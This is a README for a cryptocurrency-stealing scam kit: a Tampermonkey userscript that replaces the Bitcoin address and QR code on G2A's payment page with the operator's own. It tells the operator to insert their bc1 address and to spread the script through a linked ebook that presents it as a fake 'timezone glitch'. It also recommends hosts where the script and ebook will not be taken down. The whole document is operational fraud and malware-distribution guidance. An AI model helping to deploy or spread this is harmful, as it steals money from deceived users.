# G2A Fake "Timezone Glitch" - BTC Stealer - Replace address to your own

The script changes Bitcoin address and QR code on G2A Payment page by using Tampermonkey

![alt text](https://i.postimg.cc/brV97qH9/Screenshot-85.png)

###### Edit the script so it changes to your own btc address

Go to https://github.com/lucakonig/fake-g2a-timezone-glitch/blob/main/script.js

Copy the script, save it in your notepad or just download it

use CTRL+F 

Search for "your_btc_address"

**There are 2x "your_btc_address" to replace in the script**

Here:

![tt](https://i.imgur.com/AJp0WS1.png)

and here:

![tt](https://i.imgur.com/jVcnlXe.png)

Replace all 2 results with your bech32 bitcoin address (the one that starts with bc1) - It's important that your address starts with bc1 (bech32 type of address) because the script checks for the length of the address. If your address isn't exactly 42 characters long - just like bech32 addresses, the script's interval will never stop which causes problems with copying the script for the user as the value gets refreshed every 200 milliseconds 

Remember to check on g2a if the script is working and changing btc address to your own + qr code to your own (if it's not, then you did something wrong)

###### Other useful info

eBook: https://github.com/lucakonig/fake-g2a-timezone-glitch/blob/main/ebook%20to%20spread%20this%20method.docx

In the ebook replace links to the script and save as pdf

Use https://pst.klgrth.io/ to host your script, so it never gets removed

Use https://bunkr.is/ to host your ebook, so it never gets removed 

QR Code gets generated by API, just replace every "your_btc_address" to your "bc1......." address and you are good to go! :)

**I take no responsibility for the malicious use of this script and ebook.**
